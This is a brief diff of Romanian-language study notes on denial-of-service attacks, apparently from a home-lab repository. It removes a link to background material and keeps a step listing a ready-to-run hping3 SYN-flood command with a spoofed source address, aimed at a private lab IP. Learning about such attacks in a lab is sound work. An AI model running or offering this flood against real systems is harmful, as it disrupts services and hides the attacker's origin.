@@ -1,5 +1,5 @@
 ### Atac DoS:
-  - [Despre DoS](https://github.com/Dani780-C/Cyber-security/blob/main/learn/info_DoS_attack.md)
+  
   - Pasii atacului: 
     
         hping3 -S 192.168.56.102 -a 192.168.56.105 -p 80 --flood
